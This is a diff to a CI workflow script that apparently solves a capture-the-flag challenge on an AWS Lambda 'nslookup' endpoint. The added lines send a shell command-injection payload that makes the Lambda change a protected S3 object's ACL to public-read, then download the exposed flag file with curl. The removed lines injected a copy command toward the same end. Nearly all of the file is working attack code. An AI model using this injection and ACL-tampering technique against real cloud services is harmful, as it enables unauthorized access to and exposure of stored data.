@@ -26,22 +26,22 @@ jobs:
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           BUCKET="codec4f26c862a321ef5"
           
-          echo "=== 1. MAKING LAMBDA CLONE THE FLAG ==="
-          # This tells the Lambda to copy the locked flag.txt into a fresh, unrestricted file name
-          PAYLOAD="{\"domain\": \"127.0.0.1; aws s3 cp s3://${BUCKET}/flag.txt s3://${BUCKET}/victory.txt\"}"
+          echo "=== 1. FORCING LAMBDA TO GRANT READ PERMISSIONS ==="
+          # This command injection tells the Lambda to use its AWS CLI to make flag.txt publicly readable via ACL
+          PAYLOAD="{\"domain\": \"127.0.0.1; aws s3api put-object-acl --bucket ${BUCKET} --key flag.txt --acl public-read\"}"
           
           curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
             -d "$PAYLOAD"
           
           echo ""
-          echo "=== 2. WAITING 2 SECONDS FOR S3 SYNC ==="
+          echo "=== 2. WAITING 2 SECONDS FOR PERMISSIONS TO PROPAGATE ==="
           sleep 2
           
-          echo "=== 3. DOWNLOADING THE VICTORY FILE ==="
-          # Now your cicdRole downloads the newly created victory.txt with zero restrictions!
-          aws s3 cp "s3://${BUCKET}/victory.txt" ./final_flag.txt
+          echo "=== 3. DOWNLOADING FLAG DIRECTLY VIA HTTPS ==="
+          # Since it's now public-read, your runner can download it straight over clean HTTPS with zero IAM blocks!
+          curl -s "https://${BUCKET}.s3.${REGION}.amazonaws.com/flag.txt" -o direct_flag.txt
           
           echo ""
-          echo "=== 4. BEHOLD THE FLAG ==="
-          cat ./final_flag.txt
+          echo "=== 4. BEHOLD YOUR HARD-EARNED VICTORY ==="
+          cat direct_flag.txt
